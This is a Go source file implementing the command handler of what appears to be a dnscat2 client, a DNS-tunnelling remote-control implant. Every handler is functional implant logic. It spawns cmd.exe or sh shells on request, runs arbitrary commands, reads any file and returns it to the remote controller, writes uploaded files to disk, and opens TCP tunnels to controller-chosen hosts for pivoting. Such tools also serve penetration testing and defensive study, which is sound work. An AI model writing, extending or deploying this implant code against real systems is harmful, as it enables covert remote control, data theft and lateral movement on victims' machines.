package command

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"sync"
	"sync/atomic"
)

// SessionCreator is a callback for creating new sessions
type SessionCreator func(name, command string) uint16

// ShutdownHandler is a callback for handling shutdown
type ShutdownHandler func()

// DelayHandler is a callback for handling delay changes
type DelayHandler func(delay uint32)

// Tunnel represents an active tunnel connection
type Tunnel struct {
	ID       uint32
	Conn     net.Conn
	Host     string
	Port     uint16
	Driver   *Driver
}

// Driver implements the command driver
type Driver struct {
	stream         *bytes.Buffer
	outgoingData   []byte
	mu             sync.Mutex
	isShutdown     bool
	tunnels        map[uint32]*Tunnel
	requestID      uint32
	tunnelID       uint32

	// Callbacks
	CreateSession  SessionCreator
	OnShutdown     ShutdownHandler
	OnDelayChange  DelayHandler
}

// NewDriver creates a new command driver
func NewDriver() *Driver {
	return &Driver{
		stream:  new(bytes.Buffer),
		tunnels: make(map[uint32]*Tunnel),
	}
}

func (d *Driver) nextRequestID() uint16 {
	return uint16(atomic.AddUint32(&d.requestID, 1))
}

func (d *Driver) nextTunnelID() uint32 {
	return atomic.AddUint32(&d.tunnelID, 1)
}

// DataReceived processes incoming data
func (d *Driver) DataReceived(data []byte) {
	d.mu.Lock()
	d.stream.Write(data)
	d.mu.Unlock()

	d.processPackets()
}

func (d *Driver) processPackets() {
	d.mu.Lock()
	defer d.mu.Unlock()

	for {
		pkt, err := ReadPacket(d.stream)
		if err != nil {
			// Only print error if it's not a normal parsing situation
			// (e.g., not enough data can cause EOF)
			if d.stream.Len() > 0 {
				fmt.Printf("Error reading command packet: %v\n", err)
			}
			return
		}
		if pkt == nil {
			return // Not enough data yet
		}

		// Don't print TUNNEL_DATA packets (too noisy)
		if pkt.CommandID != TunnelData {
			fmt.Printf("Got a command: %s\n", pkt.String())
		}

		out := d.handlePacket(pkt)

		if out != nil {
			if out.CommandID != TunnelData {
				fmt.Printf("Response: %s\n", out.String())
			}
			d.outgoingData = append(d.outgoingData, out.ToBytes()...)
		}
	}
}

func (d *Driver) handlePacket(pkt *Packet) *Packet {
	switch pkt.CommandID {
	case CommandPing:
		return d.handlePing(pkt)
	case CommandShell:
		return d.handleShell(pkt)
	case CommandExec:
		return d.handleExec(pkt)
	case CommandDownload:
		return d.handleDownload(pkt)
	case CommandUpload:
		return d.handleUpload(pkt)
	case CommandShutdown:
		return d.handleShutdown(pkt)
	case CommandDelay:
		return d.handleDelay(pkt)
	case TunnelConnect:
		return d.handleTunnelConnect(pkt)
	case TunnelData:
		return d.handleTunnelData(pkt)
	case TunnelClose:
		return d.handleTunnelClose(pkt)
	case CommandError:
		return d.handleError(pkt)
	default:
		fmt.Printf("Got a command packet that we don't know how to handle!\n")
		return CreateErrorResponse(pkt.RequestID, 0xFFFF, "Not implemented yet!")
	}
}

func (d *Driver) handlePing(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}
	fmt.Println("Got a ping request! Responding!")
	return CreatePingResponse(pkt.RequestID, pkt.PingRequest.Data)
}

func (d *Driver) handleShell(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	if d.CreateSession == nil {
		return CreateErrorResponse(pkt.RequestID, 0xFFFF, "Session creation not supported")
	}

	var shellCmd string
	if runtime.GOOS == "windows" {
		shellCmd = "cmd.exe"
	} else {
		shellCmd = "sh"
	}

	sessionID := d.CreateSession(shellCmd, shellCmd)
	return CreateShellResponse(pkt.RequestID, sessionID)
}

func (d *Driver) handleExec(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	if d.CreateSession == nil {
		return CreateErrorResponse(pkt.RequestID, 0xFFFF, "Session creation not supported")
	}

	sessionID := d.CreateSession(pkt.ExecRequest.Name, pkt.ExecRequest.Command)
	return CreateExecResponse(pkt.RequestID, sessionID)
}

func (d *Driver) handleDownload(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	data, err := os.ReadFile(pkt.DownloadRequest.Filename)
	if err != nil {
		return CreateErrorResponse(pkt.RequestID, 0xFFFF, "Error opening file for reading")
	}

	return CreateDownloadResponse(pkt.RequestID, data)
}

func (d *Driver) handleUpload(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	err := os.WriteFile(pkt.UploadRequest.Filename, pkt.UploadRequest.Data, 0644)
	if err != nil {
		return CreateErrorResponse(pkt.RequestID, 0xFFFF, "Error opening file for writing")
	}

	return CreateUploadResponse(pkt.RequestID)
}

func (d *Driver) handleShutdown(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	if d.OnShutdown != nil {
		d.OnShutdown()
	}

	return CreateShutdownResponse(pkt.RequestID)
}

func (d *Driver) handleDelay(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	if d.OnDelayChange != nil {
		d.OnDelayChange(pkt.DelayRequest.Delay)
	}

	return CreateDelayResponse(pkt.RequestID)
}

func (d *Driver) handleTunnelConnect(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	addr := fmt.Sprintf("%s:%d", pkt.TunnelConnectRequest.Host, pkt.TunnelConnectRequest.Port)
	fmt.Printf("[Tunnel] connecting to %s...\n", addr)

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return CreateErrorResponse(pkt.RequestID, TunnelStatusFail,
			"The dnscat2 client couldn't connect to the remote host!")
	}

	tunnelID := d.nextTunnelID()
	tunnel := &Tunnel{
		ID:     tunnelID,
		Conn:   conn,
		Host:   pkt.TunnelConnectRequest.Host,
		Port:   pkt.TunnelConnectRequest.Port,
		Driver: d,
	}

	d.tunnels[tunnelID] = tunnel

	// Start reading from tunnel
	go d.tunnelReader(tunnel)

	fmt.Printf("[Tunnel %d] connected to %s!\n", tunnelID, addr)
	return CreateTunnelConnectResponse(pkt.RequestID, tunnelID)
}

func (d *Driver) tunnelReader(tunnel *Tunnel) {
	buf := make([]byte, 4096)
	for {
		n, err := tunnel.Conn.Read(buf)
		if n > 0 {
			d.mu.Lock()
			pkt := CreateTunnelDataRequest(d.nextRequestID(), tunnel.ID, buf[:n])
			d.outgoingData = append(d.outgoingData, pkt.ToBytes()...)
			d.mu.Unlock()
		}
		if err != nil {
			if err != io.EOF {
				fmt.Printf("[Tunnel %d] read error: %v\n", tunnel.ID, err)
			}
			d.closeTunnel(tunnel.ID, "Server closed the connection")
			return
		}
	}
}

func (d *Driver) closeTunnel(tunnelID uint32, reason string) {
	d.mu.Lock()
	defer d.mu.Unlock()

	tunnel, ok := d.tunnels[tunnelID]
	if !ok {
		return
	}

	fmt.Printf("[Tunnel %d] connection to %s:%d closed: %s\n",
		tunnel.ID, tunnel.Host, tunnel.Port, reason)

	tunnel.Conn.Close()
	delete(d.tunnels, tunnelID)

	// Send close notification
	pkt := CreateTunnelCloseRequest(d.nextRequestID(), tunnelID, reason)
	d.outgoingData = append(d.outgoingData, pkt.ToBytes()...)
}

func (d *Driver) handleTunnelData(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	d.mu.Lock()
	tunnel, ok := d.tunnels[pkt.TunnelDataRequest.TunnelID]
	d.mu.Unlock()

	if !ok {
		fmt.Printf("Couldn't find tunnel: %d\n", pkt.TunnelDataRequest.TunnelID)
		return nil
	}

	_, err := tunnel.Conn.Write(pkt.TunnelDataRequest.Data)
	if err != nil {
		d.closeTunnel(tunnel.ID, "Write error")
	}

	return nil
}

func (d *Driver) handleTunnelClose(pkt *Packet) *Packet {
	if !pkt.IsRequest {
		return nil
	}

	d.mu.Lock()
	tunnel, ok := d.tunnels[pkt.TunnelCloseRequest.TunnelID]
	d.mu.Unlock()

	if !ok {
		fmt.Printf("The server tried to close a tunnel that we don't know about: %d\n",
			pkt.TunnelCloseRequest.TunnelID)
		return nil
	}

	fmt.Printf("[Tunnel %d] connection to %s:%d closed by the client: %s\n",
		tunnel.ID, tunnel.Host, tunnel.Port, pkt.TunnelCloseRequest.Reason)

	d.mu.Lock()
	tunnel.Conn.Close()
	delete(d.tunnels, tunnel.ID)
	d.mu.Unlock()

	return nil
}

func (d *Driver) handleError(pkt *Packet) *Packet {
	if pkt.IsRequest {
		fmt.Printf("An error request was sent (weird?): %d -> %s\n",
			pkt.ErrorRequest.Status, pkt.ErrorRequest.Reason)
	} else {
		fmt.Printf("An error response was returned: %d -> %s\n",
			pkt.ErrorResponse.Status, pkt.ErrorResponse.Reason)
	}
	return nil
}

// GetOutgoing returns outgoing data
func (d *Driver) GetOutgoing(maxLength int) []byte {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.isShutdown && len(d.outgoingData) == 0 {
		return nil
	}

	if len(d.outgoingData) == 0 {
		return []byte{}
	}

	sendLen := len(d.outgoingData)
	if maxLength > 0 && sendLen > maxLength {
		sendLen = maxLength
	}

	result := make([]byte, sendLen)
	copy(result, d.outgoingData[:sendLen])
	d.outgoingData = d.outgoingData[sendLen:]

	return result
}

// Close closes the driver
func (d *Driver) Close() {
	d.mu.Lock()
	defer d.mu.Unlock()

	d.isShutdown = true

	// Close all tunnels
	for id, tunnel := range d.tunnels {
		tunnel.Conn.Close()
		delete(d.tunnels, id)
	}
}

// IsClosed returns true if driver is shut down
func (d *Driver) IsClosed() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.isShutdown
}


